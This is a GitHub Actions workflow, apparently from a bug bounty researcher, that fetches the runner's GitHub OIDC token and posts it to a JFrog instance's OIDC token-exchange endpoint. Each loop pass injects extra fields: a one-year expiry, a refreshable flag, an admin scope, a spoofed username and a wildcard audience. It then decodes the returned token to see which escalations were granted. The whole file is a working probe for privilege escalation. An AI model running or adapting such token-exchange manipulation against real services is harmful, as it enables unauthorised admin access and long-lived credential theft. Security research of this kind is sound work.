name: r31app
on:
  push:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  t:
    runs-on: ubuntu-latest
    steps:
      - run: |
          for EXTRA in '' ',"expires_in":31536000' ',"refreshable":true' ',"scope":"applied-permissions/admin"' ',"username":"sant0x@bugcrowdninja.com"' ',"audience":"*@*","expires_in":0'; do
            T=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=jfrog-github" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
            echo "### extra=$EXTRA"
            curl -s -o /tmp/o -w 'HTTP %{http_code}\n' -X POST -H 'Content-Type: application/json' -d "{\"grant_type\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"subject_token_type\":\"urn:ietf:params:oauth:token-type:id_token\",\"subject_token\":\"$T\",\"provider_name\":\"sanhacks2/r1pin@github\"$EXTRA}" https://trialuakwcj.jfrog.io/access/api/v1/oidc/token || true
            python3 -c 'import json,base64;b=open("/tmp/o").read();d=json.loads(b) if b.startswith("{") else {};t=d.get("access_token");p=(t.split(".")[1]+"==") if t else "";c=json.loads(base64.urlsafe_b64decode(p)) if t else {};print("JFROG", {k:c.get(k) for k in ("sub","scp","aud")}, "life", (c.get("exp",0)-c.get("iat",0)) if c else None, "refresh", bool(d.get("refresh_token")), "resp_expires_in", d.get("expires_in")) if t else print("BODY",b[:200])' || true
          done
